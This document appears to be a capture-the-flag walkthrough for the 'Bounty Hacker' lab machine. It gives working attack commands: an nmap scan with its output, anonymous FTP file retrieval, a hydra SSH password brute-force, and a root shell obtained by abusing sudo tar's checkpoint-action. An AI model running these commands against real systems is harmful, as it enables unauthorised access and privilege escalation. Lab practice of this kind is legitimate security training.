```bash
nmap -sC -sV -p- -Pn 10.10.187.164 --open
```

```
Nmap scan report for 10.10.187.164
Host is up (0.064s latency).
Not shown: 55634 filtered tcp ports (no-response), 9898 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.159.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:47:bd:9b:f4:a4:37:66:05:22:d5:56:23:cc:75:bb (RSA)
|   256 51:22:99:a5:fa:ac:f3:2e:ad:64:4b:26:80:df:13:8b (ECDSA)
|_  256 67:e9:ea:25:a9:02:b6:d2:87:57:79:32:5c:8b:3d:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

---

- FTP login success: **anonymous login**

![](Bounty_Hacker/assets/img-1.png)

- Get Specific File To Your Machine:

```ftp
mget file_name
```

![](Bounty_Hacker/assets/img-2.png)

![](Bounty_Hacker/assets/img-3.png)

---

### **My Machine :**

- File 1: List of Passwords

```bash
cat locks.txt
```

- File 2: Extract `lin` username

```bash
cat task.txt
```

---

### **Brute Force SSH :**

```bash
hydra -l lin -P lock.txt ssh://10.10.187.164
```

![](Bounty_Hacker/assets/img-4.png)

---

### **Privilege Escalation :**

```bash
sudo -l
```

![](Bounty_Hacker/assets/img-5.png)

- Search for `tar` Exactly `sudo` in `gtfobins`:

![](Bounty_Hacker/assets/img-6.png)

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![](Bounty_Hacker/assets/img-7.png)
